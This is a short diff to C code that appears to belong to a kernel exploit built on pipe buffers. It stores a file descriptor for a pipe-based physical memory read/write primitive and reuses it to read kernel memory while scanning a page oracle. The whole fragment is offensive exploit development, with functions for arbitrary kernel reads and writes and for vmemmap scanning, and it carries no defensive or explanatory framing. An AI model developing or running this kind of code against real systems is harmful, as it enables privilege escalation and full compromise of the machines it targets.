@@ -58,6 +58,7 @@ uintptr_t pipebuf_addr;
 int pipebuf_pipe_idx = -1;
 char physrw_readback[64];
 char physrw_after_write[64];
+int physrw_fd = -1;
 int physrw_read_ok;
 int physrw_write_ok;
 int pipe_scan_vmemmap;
@@ -706,6 +707,7 @@ int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
 }
 
 int install_pipe_physrw(int fd) {
+  physrw_fd = fd;
   if (pipebuf_page_base == 0) {
     atomic_store(&pipe_prepare_done, 0);
     atomic_store(&pipe_prepare_request, 1);
@@ -1138,7 +1140,7 @@ uintptr_t scan_p0_pipe_oracle(void) {
   if (p0_gate_page_struct && p0_physical_write_ok) {
     uintptr_t gate_direct = page_to_direct(p0_gate_page_struct);
     memset(page, 0, sizeof(page));
-    if (kernel_read_data(pipe_fds_reclaim[0][0], gate_direct,
+    if (kernel_read_data(physrw_fd, gate_direct,
                          page, scan_size) == (ssize_t)scan_size) {
       uint64_t sampled_words[P0_FINGERPRINT_WORDS];
       for (size_t word = 0; word < P0_FINGERPRINT_WORDS; word++) {
